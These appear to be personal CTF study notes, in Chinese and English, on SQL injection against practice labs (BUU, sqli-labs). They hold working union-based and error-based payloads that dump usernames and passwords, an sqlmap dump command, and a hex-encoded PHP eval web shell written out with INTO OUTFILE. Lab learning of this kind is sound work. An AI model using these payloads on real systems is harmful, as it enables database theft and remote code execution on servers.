# CTF SQL Study

## Basic

*Challenge:* BUU SQL COURSE 1

Basic progress:

1. 寻找注入点（使用and or测试逻辑）

   * 注意数字型SQL和字符串型SQL，后者需要闭合引号

2. 查找泄漏顺序&位置

   1. 列数 使用 `order by`关键字
      ```sql
      1 order by 1,2,3
      ```

      * 若列数超出，则显示空行

   2. 列回显顺序
      ```sql
      ?id=-1 union select 1,2
      ```

3. 爆破数据库

   1. 数据库名`database()`

   2. 使用`information_schema`获得数据表信息
      ```sql
      ?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='news')
      ```

   3. 获得列名
      ```sql
      ?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='news' and table_name='admin')
      ```

   4. 爆破表
      ```sql
      ?id=-1 union select (select group_concat(username) from admin),(select group_concat(password) from admin)
      ```




## Little Tricks

### Basic

* 存在错误输出时，通过增加一些dumb占位以辅助查看完整语句

  * `?id=1'`:  use near ''1'' LIMIT 0,1' at line 1
  * `?id=1'asdf`: near 'asdf' LIMIT 0,1'，**发现使用单引号闭合**

  

## SQLi-labs

### Series 1 - Basic SQL injections

1. Simple sqli, same as [Basic](#Basic)
   ```sql
   id=0%27 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'), (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')%23
   
   # dump table
   id=0%27 union select (select group_concat(id) from users),(select group_concat(id) from users),(select group_concat(password) from users)%23
   
   # dump uagents table (no content)
   ?id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="security"),(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="uagents")
   
   
   ```

2. Numeric sqli, same as 1

3. 通过加入引号等，使SQL语句报错，报错输出`... syntax to use near 'union select 1,2,3#') LIMIT 0,1'`，**包含一个)，需要同时在sqli中闭合**

   * Source code:  `$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`

   * `id=0'#`，输出`... right syntax to use near ''1'') LIMIT 0,1' at line 1`
   * `id=1")`，正常返回，**语句为单引号，双引号被解析为正常字符**，查询时被忽略
   * `id=5a') %23` 正常返回，`#` hackbar无法作为注释符号使用，加url encode `%23`通过
   * `?id=0') union select 1,2,3 %23`，获得字段回显
   * 后续正常注入

4. 单引号不报错，尝试其他符号用于闭合SQL语句

   * `?id=1"asdf %23`:   right syntax to use near` 'asdf #") LIMIT 0,1'` at line 1，**双引号+括号闭合**
   * `?id=1") order by 1,2,3 %23` Normal

5. 单引号闭合，查询成功后返回`You are in...........`

   * `?id=1' order by 1,2,3,4 %23`

   * 两种解题方式

     1. 布尔盲注爆破，脚本`sqli-blind-bruteforce-template.py` 多线程爆破数据库

     2. 错误注入（**Recommended**，如题"Double Query"）。常用报错注入方式：

        1. `floor`函数注入 [reference](https://blog.csdn.net/miraclehw/article/details/129250360)

           ```sql
           # Prototype (dump user)
           id = 1 AND (SELECT 1 from 
           (SELECT count(*),concat(0x23,(SELECT schema_name from information_schema.schemata LIMIT 0,1),0x23,floor(rand(0)*2)) as x 
           from information_schema.`COLUMNS` GROUP BY x) 
           as y)
           # Payload
           'id=-1' union select 1,count(*),concat((floor(rand(0)*2)),'--',(select concat(id,'-',username,'-',password) from security.users limit 0,1)) as x from information_schema.tables group by x%23
           ```

           * `floor(rand(0)*2)` 固定生成 `01101100111`序列，在执行group by 插入虚表时产生duplicated entry 错误
           * `count(*)`确保返回单行结果，保证内部子查询会对每一行执行

        2. `xpath` 报错注入 (`extractvalue` and `updatexml`): require mysql >= 5.1
           在xml路径（xpath）错误时，返回报错

           * ` updatexml(XML_document, XPath_string, new_value)`使用不同xml标记匹配和替换xml块

           * `extractbalue(XML_document, xpath_string)`从目标XML中返回匹配查询的字符串

           * payload
             ```sql
             and extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e))
             ```

6. 与5相同，双引号闭合

7. 错误不回显，只展示信息，成功显示`You are in.... Use outfile......`

   * 双引号正常，单引号报错，**说明是单引号字符串，包含括号**，测试得到两个括号
   * 文件注入（未成功）`id=-1')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile "E:\softs\phpstudy_pro\WWW\sqlilabs2\Less-7\mm2.php"--+`

8. 布尔盲注，可使用Lesson-5中脚本进行自动化测试

   * 也可以使用**sqlmap**: ` sqlmap -u "http://2aba3d8b-3b64-4247-8942-4de7881a9d83.node5.buuoj.cn/Less-8/?id=1" --technique B -D security -T users -C username,password --dump --threads 10 --batch    `
   * ![image-20240801215738108](./SQL Study.assets/image-20240801215738108.png)
   * <img src="./SQL Study.assets/image-20240801215931138.png" alt="image-20240801215931138" style="zoom:50%;" />
